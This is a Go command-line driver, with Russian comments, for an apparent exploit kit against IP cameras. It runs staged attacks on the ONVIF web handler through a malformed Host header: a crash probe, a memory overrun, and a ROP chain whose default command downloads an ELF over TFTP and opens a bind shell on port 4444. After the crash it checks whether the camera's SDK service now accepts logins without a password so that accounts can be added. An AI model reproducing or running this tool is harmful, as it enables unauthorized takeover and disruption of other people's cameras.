package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"time"

	"krushitel/core/exploit/cve_poc"
	"krushitel/core/fwd"
	"krushitel/core/sdk"
)

type dialer func() (net.Conn, error)

func main() {
	serial := flag.String("serial", "", "серийник: туннель своим стеком fwd")
	host := flag.String("host", "127.0.0.1", "хост без туннеля")
	port := flag.Int("port", 80, "веб-порт камеры (ONVIF-хендлер)")
	stage := flag.String("stage", "detect", "detect | overrun | rop")
	length := flag.Int("len", 2048, "длина cyclic-паттерна для overrun")
	offset := flag.Int("offset", 0, "смещение Host-буфер → RA (для rop)")
	base := flag.Uint64("base", 0, "база .text образа (для rop)")
	cmd := flag.String("cmd", "", "команда для rop (пусто — tftp+bind shell из cvepoc)")
	tftp := flag.String("tftp", "", "tftp://host/path ELF для rop")
	preload := flag.String("preload", "", "путь .so для LD_PRELOAD-варианта rop")
	bindPort := flag.Int("bind", 4444, "порт bind shell для rop")
	yes := flag.Bool("yes", false, "подтверждение деструктива (overrun/rop)")
	flag.Parse()

	if *stage != "detect" && !*yes {
		fmt.Println("[-] ступень " + *stage + " КРАШИТ auth-сервис камеры. Перечитай: -yes для согласия.")
		os.Exit(1)
	}

	var dial dialer
	if *serial != "" {
		fmt.Printf("== туннель по серийнику %s (порт %d)...\n", *serial, *port)
		f, err := fwd.Start(*serial, []fwd.PortSpec{{Local: 0, Remote: *port}}, 0, "", "")
		if err != nil {
			fmt.Println("[-] туннель не встал:", err)
			os.Exit(1)
		}
		defer f.Stop()
		p := *port
		dial = func() (net.Conn, error) { return f.DialCamera(p) }
		fmt.Println("[+] туннель ок")
	} else {
		h, p := *host, *port
		dial = func() (net.Conn, error) { return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, p), 10*time.Second) }
		fmt.Printf("== цель %s:%d\n", h, p)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	switch *stage {
	case "detect":
		fmt.Println("\n== [detect] Probe: Host с ']' без ':'")
		res := cvepoc.Probe(ctx, dial, "a]")
		report(res)
		if res.Vulnerable {
			fmt.Println("[+] ВЕРДИКТ: поведение уязвимого образа (краш/обрыв). Модель в списке affected_models — считаем уязвимой.")
		} else {
			fmt.Println("[-] ВЕРДИКТ: парсер выжил (400/501) — патч или не та прошивка.")
		}

	case "overrun":
		fmt.Printf("\n== [overrun] overflow cyclic-паттерном %d байт (КРАШ)\n", *length)
		res := cvepoc.Overrun(ctx, dial, *length)
		report(res)
		if res.Vulnerable {
			fmt.Println("[+] Запись за границу прошла (сервис отвалился).")
			fmt.Println("    Смещение до RA: подай краш-дамп через cvepoc.FindOffset(pattern, leak).")
			noauthCheck(dial)
		} else {
			fmt.Println("[-] Сервис не развалился — не та прошивка или Host-вектор не дошёл.")
		}

	case "rop":
		if *offset == 0 || *base == 0 {
			fmt.Println("[-] rop требует -offset и -base конкретного образа (см. ROPConfig).")
			os.Exit(1)
		}
		cfg := cvepoc.ROPConfig{
			Offset:        *offset,
			Base:          uint32(*base),
			TftpServer:    *tftp,
			BindShellPort: *bindPort,
		}
		payload := cvepoc.Payload{ELFURL: *tftp, Preload: *preload, BindPort: *bindPort}
		command := *cmd
		if command == "" {
			command = payload.BuildCommand()
		}
		fmt.Printf("\n== [rop] доставка цепочки (offset=%d base=%#x)\n    cmd: %s\n", *offset, *base, command)
		res, err := cvepoc.DeliverCommand(ctx, dial, cfg, command)
		if err != nil {
			fmt.Println("[-] доставка не удалась:", err)
			os.Exit(1)
		}
		report(res)
		fmt.Printf("[*] если команда дошла — слушай %s:%d\n", *host, *bindPort)

	default:
		fmt.Println("[-] неизвестная ступень:", *stage)
		os.Exit(1)
	}
}

func report(r cvepoc.Result) {
	fmt.Printf("    elapsed=%v answered=%v", r.Elapsed.Round(time.Millisecond), r.Answered)
	if r.StatusLine != "" {
		fmt.Printf(" status=%q", r.StatusLine)
	}
	if r.Err != nil {
		fmt.Printf(" err=%v", r.Err)
	}
	fmt.Printf(" vulnerable=%v\n", r.Vulnerable)
}

func noauthCheck(dial dialer) {
	conn, err := dial()
	if err != nil {
		fmt.Println("    noauth-проба: dial fail:", err)
		return
	}
	defer conn.Close()
	if sdk.TryNoAuth(conn, 8*time.Second) {
		fmt.Println("[+] SDK 37777 принимает БЕЗ пароля — auth-сервис лежит, можно addUser.")
	} else {
		fmt.Println("[-] SDK 37777 требует auth — сервис ещё жив или не задет.")
	}
}
